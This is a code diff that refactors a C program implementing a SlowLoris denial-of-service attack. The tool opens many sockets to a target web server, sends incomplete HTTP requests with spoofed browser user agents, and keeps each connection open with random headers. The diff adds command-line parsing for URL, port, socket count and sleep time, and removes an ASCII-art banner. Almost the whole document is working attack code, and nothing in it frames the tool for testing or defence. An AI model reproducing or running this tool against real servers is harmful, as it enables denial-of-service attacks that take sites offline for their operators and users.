@@ -1,91 +1,18 @@
 #include <time.h>
 #include <stdio.h>
-#include <netdb.h>
 #include <stdlib.h>
 #include <string.h>
 #include <signal.h>
+#include <netdb.h>
 #include <unistd.h>
+#include <regex.h>
+#include <errno.h>
 #include <pthread.h>
 #include <sys/types.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
 
 #define RND (65 + (rand() % 26))
-
-const char *image =
-"                                                                                                                                                       \n"
-"                                                 ^~!7??JJ???77???JJ???7!^                                                                              \n"
-"                                              ^75P5J??J5G#BP5PP?77777?JY55Y7~                                                                          \n"
-"                              ~J~            ?G57^ ^?55J7~^              ~7JPPJ!^                                                                      \n"
-"                              ^5G?^        ^5B!  ^YGY!              ^^^^~~~^~!JPPY7^                                                                   \n"
-"                                !GP!       YB~  !B5~         ^~7?YYY55YYYYYYYJY5P#&#GY7!~^^                                                            \n"
-"                                 ^JGY^    ^B5  !#J        ~?5P5J?7!~^^         ^^~!7J5PPPP5!                                                           \n"
-"                                   ~5B?   ^B5 ^PP      ~JPPJ!^                           ^^                                                            \n"
-"                                     !PG7  PP !#?   ^?5PJ~                                                                                             \n"
-"                                       7GP~7B~7B~.^?G57                                                                                                \n"
-"                         !7^            ^JG5BY7B~7GP!                                                                                                  \n"
-"                         !PP?^            ~Y&#JBPG?                                    ~?YYJ!^ ^!~^!7~                                                 \n"
-"                           !5GJ~            !B#@B~                         ^^~!^   ^^75PY!!?P5Y5GGP55BYJJ7^      ^~7?7!^                               \n"
-"                             ~JG5!           ^?#B~                   ~5GYY555YJ~?5YPP5?^     ^^ ^~^  77!7PG!   ~YP5J??5GJ^                             \n"
-"                               ^?PP?^          ^YG?           ^7!~?YYPY7?7~^    ^^~~^                    ~GBYJPBJ~~77~ !BY                             \n"
-"                                  !PG?^          7GP~      ^PGGB5557~^                                    ^^~G#P5G#5JGY ?#~                            \n"
-"                                    7PP!          ^YB7     Y#77~                                ^^~5555?^   ^7^~BPJP5PG !B~                            \n"
-"                                      ?GY^          7B5^ ^7BJ             ^^^^               ~7YPPG#7^!PG~      ~^ ^7BG J#~                            \n"
-"                                       ~5G!          ~PG5P#5           ~J555555YJ7^         JBY7~^^^^   7~          ^G5^GP                             \n"
-"                                         ?GJ          ^B@?^^         ^5GJ!^  ^~!7Y55J~     ^?!                      ^5PPB~                             \n"
-"                                 ^~777!~!!?#P~        ^?YBJ         ^PP^  ^?5555J!^~JPP7^                             !P&J                             \n"
-"                             ^7J5P#&BPB&&&##&#Y!         !B5^       7#!   5B!^^~?PP7  7PP!                            ~#P^                             \n"
-"                          ^?5PY?5G5!~YG?~~~~~?#P^         ~GP~      7#!  ^BJ    . !PP~. YG^                            JB!                             \n"
-"                        ~YPY!^!G5~  5B~       ~PG!         ^PG~     ^PP^ ^G5   ~7JYY##!  ^                    ^^^      ~#J                             \n"
-"                      ^YGY^  J#?   ^B?          YB?         ^YB7     ~GP~ ?#?!PPY7!!!?!           ^       ^7Y55Y55Y!   J#?                             \n"
-"                     ~GP~   YB!    ^BY           5&Y^         JB?     ^JGY!7PBB~               ^?GP57    7G57^^ ^~?GY^ ^7B?                            \n"
-"                    ~B5    ?#7      YB^         7B?PG~         7BJ      ^?7 !7^         ^^    ~PP7^7GP~ ^G&!^^~^   !#7   ?#?                           \n"
-"                   ^GP^   ~BY       ~#?        ^PG^ JB?         !B5^       ?#7        ~5PY~  ?BY!7!~^YB7 Y&GP5YP5~ !#7  ^5B7                           \n"
-"                   ?#!    YB^        YG^        5&7  7BY^        ~PG~      7#Y       7BY~^  ?B5GP5JPP!5B^Y@B^  ^BP PP^  ~#?.                           \n"
-"                   PP    ~BJ         !#7       ^Y&J   ~B5^        ^YB7     ^PP???7   ?BPP7 ^G5G5  .^GPJ#~7&#577YGYPG~   ^PB7                           \n"
-"                  ^B5    ?#~         ~#Y       !#P?7^  ~GP^         ?BJ     ^!7?!!    P#!   YBBG!^~JBJG5  JBBGGPPPJ^    !BYPPJ!^                       \n"
-"                   PP^   5P          ~#Y       ^!?P#7   ~B5^         !GP~      ^^     ?P5?  ^JB##GGP5G5^   ^7???7^   ~Y7PG^ ~J#5                       \n"
-"                   ?#!  ^B5          ?#!         .7&Y^^  ~B5^         ^5B7   !P5?      ^~^    ^!?JJJ7~               !&G?^    7#Y^                     \n"
-"                   ^PP^ ~BY         !BY           7#Y5? ~JGBPJ7!^       7BY^ ?#5J7                      7YYY57       Y&!       7PG~                    \n"
-"                    ~BY ^B5       ^JBY^            ?@P77#Y^ 7B@#G!       ~PG! ^7GBJ!                   !#Y^^?#7    7PP5^        7#?                    \n"
-"                     !BJ YG^    !YG5!              ^J&J~GGYJ5&&P#Y         JB?^!JP##J?J7~              ^PP~^!BJ ^7BP?^         ~P&?                    \n"
-"                      !BY!#7. 7PP?^                 7&5~?&J~!!5#BP5J^    ^YP#&P5?!~?Y55YP5!             ^J555J7GPPY^            ^JB7                   \n"
-"                       ~GPPB75G7                    !P#J^YG~. YBYPP#Y    ^5&&PJ?~       ^?G5J??777!!~^   .^7JYGY^              ^PP&5                   \n"
-"                        ^YBB#B~                      7BY^~#BYYG#P#@&J      ^!?Y#P^        ^!7?????JYY55P5JBP?!^        ~J^     ~#G?~                   \n"
-"                          7G#B^                      ?BG~^PBG5YP@G#@G^~7?JYYY55?^          ........ ~JGG?7!^           ?#!     7#Y                     \n"
-"                           ~B@7                       ?#Y7^~~!7J5PPYGB&&B7~^^^           ~7??????JY55J!                ~BY     ^5#J                    \n"
-"                            ~#P                       ~P#J          ~P@#&BPPP5?        ~5PYJJJ???7!^                ^PB7JB~  ^7G5?~                    \n"
-"                             77                       PG^             5@&BJ!~^        7BY^                          ?#YB5#7  ?#Y^                      \n"
-"                                                      JBJ!            J@&&J7J5GP!    !##!                         ~5#B^!55~  ^G5^                      \n"
-"                                                       ~P#5!          ^P#G&B##P!  ^~?B&##5?^     ^~^            ~JGY7!^    ^?75&~                      \n"
-"                                                        ^~5BYP5?       P5 ?#@BBPY55PPYB#&&&7   75P5Y^           !?~        ~#BY?^                      \n"
-"                                                          ^JY7J#7      ?B?^~JYYJ!^ ^~7P&@G5G7~PB?^ ^                       !#Y                         \n"
-"                                                              ^GP^      !PG~.   !?Y5P#@@#! ?&GG#5~                         !#7                         \n"
-"                                                               7#7       ^YPPG7^???7?GBY~   5P5B~                      ~PBJJ#7                         \n"
-"                                                                YBJ?^      ^^JPP5GGY?!^     PP!B5^                    !B57?J7^                         \n"
-"                                                                ^7YBPJJ?7!~!J7^^^?#Y .    ~5B!^BP!^                   5#~                              \n"
-"                                                                   ^7?!7JYYYGBYYY5PGP!^~?5PY~  !G#!               ^7!^J#~                              \n"
-"                                                                            ^~~~~^ ~BB5YJ7^    ^5GP!            7PGG55P?^                              \n"
-"                                                                                   Y#J~^~7?^     ~BP!^^   ^^^^~YB?~^ ^                                 \n"
-"                                                                                   ^7BBYYY7^~~    ^?BBBP?5PP55PY~                                      \n"
-"                                                                                     7P5YJJ5P7!!  !5G7!B#?^^^^                                         \n"
-"                                                                                       7&PYJJP#PYPP?^  ^YB7                                            \n"
-"                                                                                        ~??Y#&Y?7~       7B5^                                          \n"
-"                                                                                            ~PP~.         ~PG!                                         \n"
-"                                                                                              JB?           JBJ                                        \n"
-"                                                                                               !GP~          !GP^                                      \n"
-"                                                                                                ^5G7          ^YB7                                     \n"
-"                                                                                                  7BY^          7B5^                                   \n"
-"                                                                                                   ~PG!          ~J~                                   \n"
-"                                                                                                     JBJ                                               \n"
-"                                                                                                      !GP~                                             \n"
-"                                                                                                       ^5B7                                            \n"
-"                                                                                                         ?BY^                                          \n"
-"                                                                                                          ~PY                                          \n"
-"                                                                                                            ^                                          \n"
-"                                                                                                                                                       \n"
-"                                                                                                                                                       \n";
-
 
 static const char *user_agents[] = {
 	"Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
@@ -96,15 +23,30 @@ static const char *user_agents[] = {
 	"Mozilla/5.0 (X11; CrOS aarch64 15117.112.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
 };
 
+const char *green()
+{
+	return "\033[0;32m";
+}
+
+const char *red()
+{
+	return "\033[1;31m";
+}
+
+const char *reset()
+{
+	return "\033[0m";
+}
+
 static void sigint_handler(int sig)
 {
 	static char msg[] = "See You Space Cowboy...\n";
 
 	write(STDOUT_FILENO, msg, sizeof(msg));
-	exit(0);
+	exit(1);
 }
 
-void sendPayload(int sock, char *ip_str)
+void send_payload(int sock, char *ip_str)
 {
 	char buffer[256] = { 0 };
 
@@ -118,33 +60,30 @@ void sendPayload(int sock, char *ip_str)
 	send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
 	sprintf(buffer, "Content-Length: %d\r\n", RND);
 	send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
+
+	if (errno)
+		fprintf(stderr, "[!] ERRNO[%d]: %s in socket %d\n", errno,
+			strerror(errno), sock);
 }
 
-void spam(int *sockets, int n_sockets, char *ip_str, struct sockaddr_in *target)
+int spam(int *sockets, int n_sockets)
 {
-	int i;
+	int FLAG = 0;
 	char buffer[16] = { 0 };
 
 	srand(time(NULL));
 
-	for (i = 0; i < n_sockets; ++i) {
+	for (int i = 0; i < n_sockets; ++i) {
 		sprintf(buffer, "X-a: %c%c%c%c\r\n", RND, RND, RND, RND);
 		if ((send(sockets[i], buffer, strlen(buffer), MSG_NOSIGNAL) < 0)) {
-			printf("[!] May the server is not vulnerable to SlowLoris Attack: ");
-			printf("recreating a new socket.\n");
-			close(sockets[i]);
-			sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
-			if ((connect(sockets[i], (struct sockaddr *) target,
-						sizeof(struct sockaddr)) < 0)) {
-				fprintf(stderr, "[!] can not create socket %d.\n",
-						i);
-				close(sockets[i]);
-				return;
-			} else {
-				sendPayload(sockets[i], ip_str);
-			}
+			fprintf(stderr, "%s[!] server is not vulnerable to SlowLoris Attack.\n%s",
+					red(), reset());
+			FLAG = 1;
+			break;
 		}
 	}
+
+	return FLAG;
 }
 
 void get_address(char *target_name, struct sockaddr_in *ptr)
@@ -170,71 +109,174 @@ void get_address(char *target_name, struct sockaddr_in *ptr)
 				(void *) (&ptr->sin_addr.s_addr));
 	}
 
-	freeaddrinfo(p);
 	freeaddrinfo(res);
+}
+
+void options(int argc, char *argv[], char **url, uint16_t *port, int32_t *n_sockets,
+		int32_t *t_sleep)
+{
+	int opt;
+
+	while ((opt = getopt(argc, argv, ":u:p:s:t:-:h")) != -1) {
+		switch (opt) {
+		case 'u':
+			*url = optarg;
+			break;
+		case 'p':
+			*port = atoi(optarg);
+			break;
+		case 's':
+			*n_sockets = atoi(optarg);
+			break;
+		case 't':
+			*t_sleep = atoi(optarg);
+			break;
+		case ':':
+			fprintf(stderr, "%sOption -%c requires an argument.\n%s",
+					red(), optopt, reset());
+			exit(EXIT_FAILURE);
+		case '?':
+			fprintf(stderr, "%sUnknown option: -%c\n%s", red(),
+					optopt, reset());
+			exit(EXIT_FAILURE);
+		case '-':
+			if (strcmp(optarg, "url") == 0) {
+				*url = argv[optind];
+				optind++;
+			} else if (strcmp(optarg, "port") == 0 || strcmp(optarg, "p") == 0) {
+				*port = atoi(argv[optind]);
+				optind++;
+			} else if (strcmp(optarg, "sockets") == 0 || strcmp(optarg, "s") == 0) {
+				*n_sockets = atoi(argv[optind]);
+				optind++;
+			} else if (strcmp(optarg, "sleep") == 0 || strcmp(optarg, "t") == 0) {
+				*t_sleep = atoi(argv[optind]);
+				optind++;
+			} else if (strcmp(optarg, "help") == 0) {
+				fprintf(stdout, "%sUsage: %s --ip <ip_address> -p <port_number> -s <num_sockets> --help\n%s",
+						green(), argv[0], reset());
+				exit(EXIT_SUCCESS);
+			} else {
+				fprintf(stderr, "Unknown option --%s. Use --help for help.\n", optarg);
+				exit(EXIT_FAILURE);
+			}
+			break;
+		case 'h':
+			fprintf(stdout, "%sUsage: %s --ip <ip_address> -p <port_number> -s <num_sockets> --help\n%s",
+					green(), argv[0], reset());
+			exit(EXIT_SUCCESS);
+		default:
+			fprintf(stderr, "%sUsage: %s --ip <ip_address> -p <port_number> -s <num_sockets> --help\n%s",
+					green(), argv[0], reset());
+			exit(EXIT_FAILURE);
+		}
+	}
+
+	if (!*url) {
+		fprintf(stderr, "%sUnkown url%s\n", red(), reset());
+		exit(EXIT_FAILURE);
+	}
+}
+
+char *extract_domain(char *url)
+{
+	const char *pattern = "https?://([^/]+).*";
+	regex_t regex;
+	regmatch_t matches[2];
+	int status = regcomp(&regex, pattern, REG_EXTENDED);
+
+	if (status) { return url; }
+
+	status = regexec(&regex, url, 2, matches, 0);
+
+	if (status) {
+		regfree(&regex);
+		return url;
+	}
+
+	size_t match_length = matches[1].rm_eo - matches[1].rm_so;
+	char* result = (char*)malloc(match_length + 1);
+
+	if (!result) {
+		regfree(&regex);
+		return url;
+	}
+
+	snprintf(result, match_length + 1, "%.*s", (int) match_length,
+			url + matches[1].rm_so);
+	regfree(&regex);
+
+	return result;
 }
 
 int main(int argc, char *argv[])
 {
-	if (argc != 5) {
-		printf("%s\n\n", image);
-		printf("%s IP PORT SOCKETS SLEEP_TIME\n", argv[0]);
-		return EXIT_FAILURE;
-	}
-
 	signal(SIGINT, sigint_handler);
 
-	int i, launch = 1;
-	int n_sockets = strtol(argv[3], NULL, 10);
-	int tempo = strtol(argv[4], NULL, 10);
-	char ip_str[INET_ADDRSTRLEN] = { 0 };
+	int32_t n_sockets = 32, launch = 1, t_sleep = 5;
+	uint16_t port = 80;
+	char *url = NULL, ip_str[INET_ADDRSTRLEN] = { 0 };
 	struct sockaddr_in target;
 
 	memset(&target, 0, sizeof(struct sockaddr_in));
 
-	target.sin_family = AF_INET;
-	target.sin_port = htons(strtol(argv[2], NULL, 10));
+	options(argc, argv, &url, &port, &n_sockets, &t_sleep);
 
-	get_address(argv[1], &target);
+	url = extract_domain(url);
+
+	target.sin_family = AF_INET;
+	target.sin_port = htons(port);
+	get_address(url, &target);
 
 	inet_ntop(AF_INET, (void *) &target.sin_addr.s_addr, ip_str,
 			sizeof(ip_str));
 
-	printf("attacking address: %s\n", ip_str);
+	printf("%s[i] attacking on address: %s\n", green(), ip_str);
+	printf("[i] port %d\n", port);
+	printf("[i] number of connections %d\n", n_sockets);
+	printf("[i] sleep mode is %d sec %s\n\n\n", t_sleep, reset());
 
-	int *sockets = (int *) malloc(n_sockets * sizeof(int *));
+	int *sockets = (int *) malloc(n_sockets * sizeof(int));
 
-	if (sockets == NULL) {
+	if (!sockets) {
 		printf("[!] problem in memory allocation\nExiting...\n");
 		return EXIT_FAILURE;
 	}
 
-	for (i = 0; i < n_sockets; ++i) {
+	for (int i = 0; i < n_sockets; ++i) {
 		sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
 
 		if (sockets[i] == -1) {
-			printf("[!] can not create socket %d.\n", i + 1);
+			fprintf(stderr, "%s[!] can not create socket %d.\n%s",
+					red(), i + 1, reset());
+			free(sockets);
 			return EXIT_FAILURE;
 		}
-		printf("[i] created socket number %d.\n", i + 1);
 
-		if ((connect(sockets[i], (struct sockaddr *) &target,
-						sizeof(target)) < 0)) {
-			printf("[!] can not create socket %d.\n", i + 1);
+		printf("%s[i] created socket number %d.%s\n",
+				green(), i + 1, reset());
+
+		if (connect(sockets[i], (struct sockaddr *) &target,
+					sizeof(target)) == -1) {
+			printf("%s[!] ERRNO: %s\n%s", green(),
+					strerror(errno), reset());
+			free(sockets);
 			return EXIT_FAILURE;
 		}
-		sendPayload(sockets[i], ip_str);
+		send_payload(sockets[i], ip_str);
 	}
 
 	while (1) {
-		printf("[i] launched number %d completed.\n", launch++);
-		printf("[i] sleeping for %02d seconds.\n", tempo);
-		spam(sockets, n_sockets, ip_str, &target);
-		printf("[i] restarting attack.\n");
-		sleep(tempo);
+		printf("%s[i] launched number %d completed.\n%s",
+				green(), launch++, reset());
+		printf("%s[i] sleeping for %02d seconds.\n%s",
+				green(), t_sleep, reset());
+		if (spam(sockets, n_sockets)) { break; }
+		printf("%s[i] restarting attack.\n%s", green(), reset());
+		sleep(t_sleep);
 	}
 
 	free(sockets);
 
-	return 0;
+	return EXIT_SUCCESS;
 }
